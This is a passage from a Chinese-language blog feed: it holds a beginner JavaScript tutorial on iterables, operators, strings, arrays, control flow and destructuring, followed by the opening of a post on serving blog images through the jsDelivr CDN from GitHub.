3</span></span><br></pre></td></tr></table></figure><h2 id="iterable"><a href="#iterable" class="headerlink" title="iterable"></a>iterable</h2><p>同样是ES6被引入，Map和Set、Array都是iterable类型的，可以通过for…of遍历</p><p>for…in 和 for…of 的区别就是使用数组时，因为数组也是对象，in会将特殊的属性边遍历出来，而of不会，of遍历map时会得到多个长度为2的数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> x <span class="keyword">of</span> m) &#123; <span class="comment">// 遍历Map</span></span><br><span class="line">    <span class="built_in">console</span>.log(x[<span class="number">0</span>] + <span class="string">&#x27;=&#x27;</span> + x[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="comment">/*[&quot;Michael&quot;, 95]</span></span><br><span class="line"><span class="comment">[&quot;Bob&quot;, 75]</span></span><br><span class="line"><span class="comment">[&quot;Tracy&quot;, 85]*/</span></span><br></pre></td></tr></table></figure><p>实际上更常用的是使用内置方法forEach来遍历</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">a.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">v, k, arr</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// v: 指向当前元素的值</span></span><br><span class="line">    <span class="comment">// k: 指向当前索引</span></span><br><span class="line">    <span class="comment">// arr: 指向Array对象本身</span></span><br><span class="line">    <span class="built_in">console</span>.log(k + <span class="string">&#x27;= &#x27;</span> + v);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>set的前两个参数一样，因为没有索引</p><p>map同上</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算术"><a href="#算术" class="headerlink" title="算术"></a>算术</h3><table><thead><tr><th>运算符</th><th>名称</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td><code>+</code></td><td>加法</td><td>两个数相加。</td><td><code>6 + 9</code></td></tr><tr><td><code>-</code></td><td>减法</td><td>从左边减去右边的数。</td><td><code>20 - 15</code></td></tr><tr><td><code>*</code></td><td>乘法</td><td>两个数相乘。</td><td><code>3 * 7</code></td></tr><tr><td><code>/</code></td><td>除法</td><td>用右边的数除左边的数</td><td><code>10 / 5</code></td></tr><tr><td><code>%</code></td><td>求余(有时候也叫取模)</td><td>在你将左边的数分成同右边数字相同的若干整数部分后，返回剩下的余数</td><td><code>8 % 3</code> (返回 2，8除以3的倍数，余下2 。)</td></tr><tr><td><code>**</code></td><td>幂</td><td>取底数的指数次方，即指数所指定的底数相乘。它在EcmaScript 2016 中首次引入。</td><td><code>5 ** 5</code> (返回 3125，相当于 <code>5 * 5 * 5 * 5 * 5</code> 。)</td></tr></tbody></table><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><table><thead><tr><th>运算符</th><th>名称</th><th>作用</th><th>示例</th><th>等价于</th></tr></thead><tbody><tr><td><code>+=</code></td><td>加法赋值</td><td>右边的数值加上左边的变量，然后再返回新的变量。</td><td><code>x = 3;    x += 4;</code></td><td><code>x = 3;    x = x + 4;</code></td></tr><tr><td><code>-=</code></td><td>减法赋值</td><td>左边的变量减去右边的数值，然后再返回新的变量。</td><td><code>x = 6;    x -= 3;</code></td><td><code>x = 6;    x = x - 3;</code></td></tr><tr><td><code>*=</code></td><td>乘法赋值</td><td>左边的变量乘以右边的数值，然后再返回新的变量。</td><td><code>x = 2;    x *= 3;</code></td><td><code>x = 2;    x = x * 3;</code></td></tr><tr><td><code>/=</code></td><td>除法赋值</td><td>左边的变量除以右边的数值，然后再返回新的变量。</td><td><code>x = 10;    x /= 5;</code></td><td><code>x = 10;    x = x / 5;</code></td></tr></tbody></table><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><table><thead><tr><th>运算符</th><th>名称</th><th>作用</th><th>示例</th></tr></thead><tbody><tr><td><code>===</code></td><td>严格等于</td><td>测试左右值是否相同</td><td><code>5 === 2 + 4</code></td></tr><tr><td><code>!==</code></td><td>严格不等于</td><td>测试左右值是否<strong>不</strong>相同</td><td><code>5 !== 2 + 3</code></td></tr><tr><td><code>&lt;</code></td><td>小于</td><td>测试左值是否小于右值。</td><td><code>10 &lt; 6</code></td></tr><tr><td><code>&gt;</code></td><td>大于</td><td>测试左值是否大于右值</td><td><code>10 &gt; 20</code></td></tr><tr><td><code>&lt;=</code></td><td>小于或等于</td><td>测试左值是否小于或等于右值。</td><td><code>3 &lt;= 2</code></td></tr><tr><td><code>&gt;=</code></td><td>大于或等于</td><td>测试左值是否大于或等于正确值。</td><td><code>5 &gt;= 4</code></td></tr></tbody></table><blockquote><p><code>==</code>与<code>===</code>的区别：<code>==</code>可以比较类型不同的值（结果难以预料）</p></blockquote><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight html"><figcaption><span>test.html &gt;folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&#x27;sw&#x27;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The button is true<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span> =<span class="string">&#x27;./js/switcher.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><figcaption><span>switcher.js &gt;folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.sw&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> txt = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.sw + p&#x27;</span>);</span><br><span class="line">btn.addEventListener(<span class="string">&#x27;click&#x27;</span>,switcher);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">switcher</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (btn.textContent === <span class="string">&#x27;true&#x27;</span>)&#123;</span><br><span class="line">        btn.textContent = <span class="string">&#x27;off&#x27;</span>;</span><br><span class="line">        txt.textContent =<span class="string">&#x27;The button is off&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        btn.textContent = <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">        txt.textContent = <span class="string">&#x27;The button is true&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>普普通通的字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&#x27;What is up?&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="string">&quot;I&#x27;am fine&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> c = <span class="string">&#x27;I\&#x27; am fine&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="连接字符串"><a href="#连接字符串" class="headerlink" title="连接字符串"></a>连接字符串</h3><p>使用<code>+</code>将字符串连起来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&#x27;hello &#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> c = a +b;</span><br><span class="line"><span class="keyword">let</span> d = c + <span class="string">&#x27;where are you?&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="数字与字符"><a href="#数字与字符" class="headerlink" title="数字与字符"></a>数字与字符</h3><p>1.连接字符串和数字时，会自动把数字变成字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">19</span>;</span><br><span class="line"><span class="keyword">let</span> b = test;</span><br><span class="line"><span class="keyword">let</span> c = a+b;</span><br></pre></td></tr></table></figure><p>2.数字–&gt;字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">23</span>;</span><br><span class="line"><span class="keyword">let</span> b = a.toString();</span><br></pre></td></tr></table></figure><p>3.字符串–&gt;数字</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&#x27;23&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="built_in">Number</span>(a);</span><br></pre></td></tr></table></figure><h3 id="处理字符串"><a href="#处理字符串" class="headerlink" title="处理字符串"></a>处理字符串</h3><p>建议在处理字符串时，先考虑官方提供的方法</p><p>1.获取长度<code>length</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;manu&#x27;</span>;</span><br><span class="line">name.length;</span><br></pre></td></tr></table></figure><p>2.获取特定字符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一个字符</span></span><br><span class="line">name[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//最后一个字符</span></span><br><span class="line">name[name.length-<span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>3.获取子字符串位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name.indexOf(<span class="string">&#x27;herd&#x27;</span>);</span><br></pre></td></tr></table></figure><p>返回4，若找不到，则返回-1</p><p>4.获取规定位置的字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//得到索引1到最后的字符串</span></span><br><span class="line">name.slice(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//3-5的字符串</span></span><br><span class="line">name.slice(<span class="number">3</span>,<span class="number">5</span>);</span><br><span class="line"><span class="comment">//从索引2开始截取3字符</span></span><br><span class="line">name.substr(<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>5.大小写转换</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name.toLowerCase();</span><br><span class="line">name.toUpperCase();</span><br></pre></td></tr></table></figure><p>6.替换</p><p>replace需要两个参数，一是需要替换的字符，而是替换后的字符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name.replace(<span class="string">&#x27;she&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br></pre></td></tr></table></figure><p>注意，不改变原name的值，他只是返回一个新的值</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组可以存储任意类型，包括数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="number">3</span>,<span class="number">5</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]];</span><br><span class="line"><span class="comment">//访问</span></span><br><span class="line">arr[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//修改</span></span><br><span class="line">arr[<span class="number">0</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="处理数组"><a href="#处理数组" class="headerlink" title="处理数组"></a>处理数组</h3><p>1.获取长度</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.length;</span><br></pre></td></tr></table></figure><p>2.遍历数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.字符串与数组的转换</p><p>字符串–&gt;数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;1,2,3,4,5,6,7,8,9&#x27;</span>;</span><br><span class="line"><span class="comment">//使用逗号分离每个元素</span></span><br><span class="line"><span class="keyword">let</span> arr = numStr.split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line"><span class="comment">//[&quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;]</span></span><br></pre></td></tr></table></figure><p>数组–&gt;字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> newStr = arr.join(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line"><span class="comment">//&quot;1-2-3-4-5-6-7-8-9&quot;</span></span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"><span class="keyword">let</span> newStr2 = arr.toString();</span><br><span class="line"><span class="comment">//&quot;1,2,3,4,5,6,7,8,9&quot;</span></span><br><span class="line"><span class="comment">//toString的局限就是不能控制分隔符</span></span><br></pre></td></tr></table></figure><h3 id="添加与删除元素"><a href="#添加与删除元素" class="headerlink" title="添加与删除元素"></a>添加与删除元素</h3><p>1.在末尾添加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr.push(<span class="number">4</span>);</span><br><span class="line"><span class="comment">//会返回新数组长度，可以添加多个元素，如</span></span><br><span class="line">arr.push(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>);</span><br></pre></td></tr></table></figure><p>2.删除末尾</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr.pop();</span><br><span class="line"><span class="comment">//返回删除的值</span></span><br></pre></td></tr></table></figure><p>3.在开头添加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr.unshift(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="comment">//返回新数组长度</span></span><br></pre></td></tr></table></figure><p>4.删除开头</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr.shift();</span><br><span class="line"><span class="comment">//返回删除的值</span></span><br></pre></td></tr></table></figure><h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(boolean)&#123;</span><br><span class="line"><span class="comment">//run code</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//run code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>if分支</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(boolean)&#123;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><p>switch可以写的if也可以写，switch相对比较简洁，但if可以写的switch不一定可以写（有范围时）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">switch</span>(a)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">console</span>.log(<span class="number">0</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: <span class="built_in">console</span>.log(<span class="number">2</span>);<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="for…in"><a href="#for…in" class="headerlink" title="for…in"></a>for…in</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Jack&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="attr">city</span>: <span class="string">&#x27;Beijing&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> o) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key); <span class="comment">// &#x27;name&#x27;, &#x27;age&#x27;, &#x27;city&#x27;</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> a) &#123;</span><br><span class="line">    <span class="comment">// 遍历的是属性</span></span><br><span class="line">    <span class="built_in">console</span>.log(i); <span class="comment">// &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;</span></span><br><span class="line">    <span class="built_in">console</span>.log(a[i]); <span class="comment">// &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(boolean)&#123;</span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h2><p>同时对一组变量进行赋值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> [x, y, z] = [<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;JavaScript&#x27;</span>, <span class="string">&#x27;ES6&#x27;</span>];</span><br><span class="line"><span class="comment">//嵌套赋值</span></span><br><span class="line"><span class="keyword">let</span> [x, [y, z]] = [<span class="string">&#x27;hello&#x27;</span>, [<span class="string">&#x27;JavaScript&#x27;</span>, <span class="string">&#x27;ES6&#x27;</span>]];</span><br></pre></td></tr></table></figure><p>从一个对象获取属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="attr">gender</span>: <span class="string">&#x27;male&#x27;</span>,</span><br><span class="line">    <span class="attr">passport</span>: <span class="string">&#x27;G-12345678&#x27;</span>,</span><br><span class="line">    <span class="attr">school</span>: <span class="string">&#x27;No.4 middle school&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 因为对象不是iterable类型的，所以不能用[]</span></span><br><span class="line"><span class="keyword">var</span> &#123;name,age,gender&#125; = person;</span><br></pre></td></tr></table></figure><p>对象的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> animal = &#123;</span><br><span class="line"><span class="attr">age</span> : <span class="number">2</span>,</span><br><span class="line"><span class="attr">name</span> : <span class="string">&#x27;haho&#x27;</span>,</span><br><span class="line"><span class="attr">gender</span> : <span class="string">&#x27;male&#x27;</span>,</span><br><span class="line"><span class="attr">son</span> :&#123;</span><br><span class="line">    <span class="attr">info</span>: <span class="string">&#x27;foo&#x27;</span>,</span><br><span class="line">    <span class="attr">other</span>: <span class="string">&#x27;bar&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//注意层次</span></span><br><span class="line"><span class="keyword">var</span> &#123;age, name, <span class="attr">son</span>:&#123;info, other&#125;&#125; = animal;</span><br></pre></td></tr></table></figure><p>重命名</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">age</span>:ag, <span class="attr">name</span>:na, <span class="attr">son</span>:&#123;<span class="attr">info</span>:inf, <span class="attr">other</span>:ot&#125;&#125; = animal;</span><br></pre></td></tr></table></figure><p>为了防止没有找到属性而出现undefined，可以设置一个默认值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;age,flag = <span class="literal">false</span>&#125; = animal;</span><br></pre></td></tr></table></figure><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>快速交换值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>, b=<span class="number">2</span>;</span><br><span class="line">[a,b] = [b,a];</span><br></pre></td></tr></table></figure><p>将对象作为参数传入函数，可选择性传递参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildDate</span>(<span class="params">&#123;year, month, day, hour=<span class="number">0</span>, minute=<span class="number">0</span>, second=<span class="number">0</span>&#125;</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(year + <span class="string">&#x27;-&#x27;</span> + month + <span class="string">&#x27;-&#x27;</span> + day + <span class="string">&#x27; &#x27;</span> + hour + <span class="string">&#x27;:&#x27;</span> + minute + <span class="string">&#x27;:&#x27;</span> + second);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用</span></span><br><span class="line">buildDate(&#123; <span class="attr">year</span>: <span class="number">2017</span>, <span class="attr">month</span>: <span class="number">1</span>, <span class="attr">day</span>: <span class="number">1</span> &#125;);</span><br><span class="line"><span class="comment">// Sun Jan 01 2017 00:00:00 GMT+0800 (CST)</span></span><br></pre></td></tr></table></figure><h2 id="JS对象类型的坑"><a href="#JS对象类型的坑" class="headerlink" title="JS对象类型的坑"></a>JS对象类型的坑</h2><p>这是<a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023021722631296">廖雪峰老师</a>总结的，抄在这里方便自己以后碰到这些问题而找不到头脑</p><ul><li><p>不要使用<code>new Number()</code>、<code>new Boolean()</code>、<code>new String()</code>创建包装对象；</p></li><li><p>用<code>parseInt()</code>或<code>parseFloat()</code>来转换任意类型到<code>number</code>；</p></li><li><p>用<code>String()</code>来转换任意类型到<code>string</code>，或者直接调用某个对象的<code>toString()</code>方法；</p></li><li><p>通常不必把任意类型转换为<code>boolean</code>再判断，因为可以直接写<code>if (myVar) &#123;...&#125;</code>；</p></li><li><p><code>typeof</code>操作符可以判断出<code>number</code>、<code>boolean</code>、<code>string</code>、<code>function</code>和<code>undefined</code>；</p></li><li><p>判断<code>Array</code>要使用<code>Array.isArray(arr)</code>；</p></li><li><p>判断<code>null</code>请使用<code>myVar === null</code>；</p></li><li><p>判断某个全局变量是否存在用<code>typeof window.myVar === &#39;undefined&#39;</code>；</p></li><li><p>函数内部判断某个变量是否存在用<code>typeof myVar === &#39;undefined&#39;</code>。</p></li><li><p>数字的<code>toString()</code>方法需要特殊使用</p><ul><li>123..toString()</li><li>(123).toString()</li></ul></li></ul><blockquote><p><a href="http://www.fedlab.tech/archives/888.html">Number调用toString()方法产生的问题</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>免费的CDN+Picgo</title>
      <link href="/TechnicalExperience/Blog/CDN-jsDeliver-Github.html"/>
      <url>/TechnicalExperience/Blog/CDN-jsDeliver-Github.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p></blockquote><p>通过CDN加快网站访问速度，提升用户体验</p><span id="more"></span><p>1.在github创建仓库，将访问的资源放上去并发布</p><p>2.通过jsDeliver引用资源</p><p><code>https://cdn.jsdelivr.net/gh/你的用户名/你的仓库名@发布的版本号或者分支名/文件路径</code></p><p>如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/20203f67c6b831ace4d1fe4d068600c2cfd6.jpg&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:20%;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/943a485d76fbbcc50c15a49f5644cbb1.png&quot;</span> <span class="attr">style</span>=<span 